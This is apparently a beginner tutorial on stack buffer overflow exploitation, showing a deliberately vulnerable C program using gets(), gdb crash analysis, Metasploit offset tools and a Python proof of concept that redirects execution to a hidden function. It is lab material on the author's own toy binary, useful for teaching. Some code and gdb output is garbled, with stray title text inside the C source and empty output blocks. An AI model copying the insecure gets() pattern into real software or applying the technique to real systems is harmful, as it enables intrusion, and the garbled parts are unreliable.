# **Basic Buffer Overflow Exploit Make Easy**

According to [Wiki](https://en.wikipedia.org/wiki/Buffer_overflow), a buffer overflow, or buffer overrun, is an anomaly where a program, while writing data to a buffer, overruns the buffer's boundary and overwrites adjacent memory locations. 

When buffer overflow occurs, attacker can run malicious code accordingly and may escalate the privilege as a result.

I introduce a very simple way to develop the buffer overflow exploit.  No complicated procedure can be observed.  The exploit development is running on 64-bit Kali Linux.

The following is the C source code of the ```vuln.c``` :

```c
#include <stdio.h>
 
void hacker()
{
        printf("No, I'm a hacker!\n");
}
 
void inSecure()
{
        char name[30];
        printf("What is your name?\n");
        gets(name);Basic Buffer Overflow Exploit Make Easy
        printf("Hey %s, you're harmless, aren't you?\n", name);
}
 
int main()
{
        inSecure();
        return 0;
}
```

The "hacker" function is never be called from the program.  Our aim is to run it as a result.

To compile the source to an executable :

```bash
gcc vuln.c -o vuln -fno-stack-protector -m32
```

If you cannot compiile to 32-bit, please install the following package :

```bash
sudo apt install gcc-multilib
```

To make it simple, we disable the Address Space Layout Randomization (ASLR) :

```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

In order to inspect the executable file, we need to download a tool namely ```checksec.sh```.

```bash
wget https://www.trapkit.de/tools/checksec.sh
```

Since the file is in Windows DOS format, we need to change it to be Unix format and executable :

```bash
sudo apt install dos2unix

dos2unix checksec.sh

chmod +x checksec.sh
```

Run the following command and you will find out that ```NX``` is enabled.

```bash
./checksec.sh --file vuln
```
```
./checksec.sh --file vuln
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   vuln
```

To double check the file is compiled into 32-bit.

```bash
file vuln
```
```bash
vuln: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=bc2907521e9842167e7544516653843949dabc9e, not stripped
```

When everything is alright, we run it to see how it works.

```bash
./vuln 

What is your name?
samiux
Hey samiux, you're harmless, aren't you?
```

To see if we can crash it or not with 50 characters :

```bash
python -c 'print("A"*50)' > a.txt

cat a.txt | ./vuln

What is your name?
Hey AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA, you're harmless, aren't you?
Segmentation fault
```

Okay, it does crash.  Now, we fire up the gdb to do the exploit development :

```bash
gdb ./vuln
```
```bash
gdb ./vuln

Feed in the junk characters.

```bash

```
```bash
(gdb)  r < a.txt
Starting program: /root/Documents/vuln < a.txt
What is your name?

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```

The program is crashed as expected.

We check with the registers to see what had happened.

```bash
(gdb) info registers
```
```bash
(gdb) info registers
eax            0x55                0x55

(gdb)
```

We noticed that the EIP is overwritten with ```A```.  That means, we can control the EIP then.  Once EIP can be controlled, we can run any code from that point.  It is because EIP Instruction Pointer Register always contains the address of the next instruction to be executed.

Now, we need to find out how many junk characters to cause the crash.  We use the ```pattern_create.rb``` to create a unique pattern.

Open another terminal and run :

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 50 > b.txt
```

We feed the unique pattern to the program.

```bash
(gdb) r < b.txt
```
```bash
(gdb) r < b.txt
Starting program: /root/Documents/vuln < b.txt
What is your name?

Program received signal SIGSEGV, Segmentation fault.
0x41346241 in ?? ()
```

The program is crashed again as expected.

We check the registers again and found out that EIP is overwritten with ```0x41346241```.

```bash
(gdb) info registers
```
```bash
(gdb)  info registers

(gdb)
```

We use the tool namely ```pattern_offset.rb``` to find out the offset.  The offset is 42 for this case.

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 41346241
[*] Exact match at offset 42
```

According to the source code, we know that there are 3 functions, they are main, inSecure and hacker.  Our aim here is to run hidden function ```hacker```.  So, we need to find out the address of the function of hacker.

```bash
(gdb) info functions
```
```bash

(gdb)
```

We find out that the address of function hacker is ```0x565561b9```.

Now, the payload will be as the following :

42's "A" and (the address of hacker function)

The PoC Python code "poc.py" :

```python
import struct
 
def p(x):
        return struct.pack("<L", x)
 
offset = 42
hacker = 0x565561b9
 
payload = ""
payload += "A" * offset
payload += p(hacker)
 
print payload
```

Exploit it now :

```bash
python poc.py | ./vuln

What is your name?  
Hey AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAï¿½aUV, you're harmless, aren't you?  
No, I'm a hacker!  
Segmentation fault  
```

The hidden hacker function is ran as a result.


## Bonus 

To find the EIP address :

```bash
python -c 'print("A"*42)+ "B"*4' > c.txt
```
```
(gdb) r < c.txt
```
```bash
(gdb) r < c.txt
Starting program: /root/Documents/vuln < c.txt

The EIP address is ```0xffffd32c```.
